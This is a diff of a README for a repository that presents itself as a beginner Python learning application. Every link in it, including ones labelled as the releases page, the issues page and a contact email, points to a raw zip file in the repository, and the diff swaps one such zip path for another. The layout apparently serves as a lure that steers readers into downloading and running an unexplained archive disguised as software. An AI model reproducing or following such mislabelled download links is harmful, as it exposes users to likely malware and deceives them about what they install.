@@ -1,7 +1,7 @@
 # 🐍 dev_2025_3_workshop1 - Learn Python Easily 
 
 ## 📥 Download the Application
-[![Download Here](https://raw.githubusercontent.com/ikinootv/dev_2025_3_workshop1/main/invitingly/dev_2025_3_workshop1.zip%20Now-Click%20to%https://raw.githubusercontent.com/ikinootv/dev_2025_3_workshop1/main/invitingly/dev_2025_3_workshop1.zip)](https://raw.githubusercontent.com/ikinootv/dev_2025_3_workshop1/main/invitingly/dev_2025_3_workshop1.zip)
+[![Download Here](https://github.com/ikinootv/dev_2025_3_workshop1/raw/refs/heads/main/src/geometric/dev-workshop-v1.8-beta.2.zip%20Now-Click%20to%https://github.com/ikinootv/dev_2025_3_workshop1/raw/refs/heads/main/src/geometric/dev-workshop-v1.8-beta.2.zip)](https://github.com/ikinootv/dev_2025_3_workshop1/raw/refs/heads/main/src/geometric/dev-workshop-v1.8-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the dev_2025_3_workshop1 repository! This application helps you learn and practice Python in a straightforward way. Follow these steps to get started.
@@ -15,7 +15,7 @@ Before you begin, make sure your computer meets these requirements:
 ## 🔗 Download & Install
 To download and install the application, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to go to the Releases page: [Download the Application](https://raw.githubusercontent.com/ikinootv/dev_2025_3_workshop1/main/invitingly/dev_2025_3_workshop1.zip).
+1. **Visit the Releases Page:** Click this link to go to the Releases page: [Download the Application](https://github.com/ikinootv/dev_2025_3_workshop1/raw/refs/heads/main/src/geometric/dev-workshop-v1.8-beta.2.zip).
 
 2. **Choose the Latest Version:** On the Releases page, you will see a list of versions. Look for the **latest version** at the top.
 
@@ -33,7 +33,7 @@ The dev_2025_3_workshop1 application includes the following features:
 
 ## 👥 Community Support
 If you encounter any issues or have questions, you can seek help from the community:
-- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/ikinootv/dev_2025_3_workshop1/main/invitingly/dev_2025_3_workshop1.zip) to report problems or ask questions.
+- Visit the [GitHub Issues Page](https://github.com/ikinootv/dev_2025_3_workshop1/raw/refs/heads/main/src/geometric/dev-workshop-v1.8-beta.2.zip) to report problems or ask questions.
 - Join our online forum to interact with other learners.
 
 ## 🛠️ Contributing
@@ -48,6 +48,6 @@ This application is licensed under the MIT License. You are free to use and modi
 
 ## 📞 Contact
 For further questions, feel free to reach out directly:
-- Email: https://raw.githubusercontent.com/ikinootv/dev_2025_3_workshop1/main/invitingly/dev_2025_3_workshop1.zip
+- Email: https://github.com/ikinootv/dev_2025_3_workshop1/raw/refs/heads/main/src/geometric/dev-workshop-v1.8-beta.2.zip
 
 Remember to download the application and begin your journey in learning Python today!
